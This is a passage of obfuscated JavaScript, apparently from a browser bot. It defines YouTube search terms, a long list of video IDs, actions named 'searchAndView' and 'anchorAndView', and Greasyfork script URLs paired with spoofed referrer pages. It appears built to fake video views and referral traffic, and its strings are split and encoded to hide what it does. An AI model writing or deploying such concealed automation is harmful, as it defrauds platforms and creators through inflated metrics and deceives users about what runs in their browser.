'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + V(0x4, 'YNRr') + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x18d5 + -0x2429 + 0x3d08)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2 * 0xc2d + 0x1a6d + -0x32bd)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x12 * -0x3f + 0x1e8c + -0x1a1b);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    V(0x8, 'UzIJ') + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    W(0xe) + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    X(0x1) + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0xb, 'YoP9') + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + V(0x11, '%ez9') + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
